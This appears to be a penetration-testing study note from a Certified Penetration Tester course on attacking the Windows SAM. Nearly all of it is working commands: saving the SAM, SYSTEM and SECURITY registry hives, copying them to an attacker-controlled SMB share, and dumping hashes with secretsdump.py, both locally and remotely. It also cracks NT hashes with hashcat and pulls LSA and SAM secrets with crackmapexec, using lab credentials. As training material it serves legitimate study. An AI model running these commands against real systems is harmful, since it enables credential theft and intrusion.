Attacking the SAM
####################

Date: 2024-11-22 08:05

Status:

Tags: 

:ref:`Certified Penetration Tester <Certified Penetration Tester>`
:ref:`Password Attacks <Password Attacks>`

Obtaining the Windows SAM hashes
********************************


.. code:: powershell

   reg.exe save hklm\sam c:\temp\sam.save
   reg.exe save hklm\system c:\temp\system.save
   reg.exe save hklm\security c:\temp\security.save

Create a share with :ref:`smbserver.py <smbserver.py>`

.. code:: bash

   sudo python3 smbserver.py -smb2support CompData /home/sambamount

And move these files to your attack machine.

.. code:: powershell

   move sam.save \\<attack-ip>\CompData
   move system.save \\<attack-ip>\CompData
   move security.save \\<attack-ip>\CompData

The secretsdump.py script from impacket to dump the hashes

.. code:: bash

   python secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

Example: Dumping the hashes remotely with secretsdump.py

.. code:: bash

   python secretsdump.py administrator.htb/ethan:limpbizkit@10.129.127.173

Example: Cracking NT hashes with hashcat

.. code:: bash

   sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt

Getting credentials remotely
************************************

**LSASS** is the Local Security Authority Sub System

If you have credentials of a user that has local admin privileges, you
can dump the LSA secrets remotely

Example 1: using :ref:`crackmapexec <crackmapexec>` and the –lsa flag

.. code:: bash

   crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa

Example 2: using :ref:`crackmapexec <crackmapexec>` and the –sam flag

.. code:: bash

   crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam

References
****************************
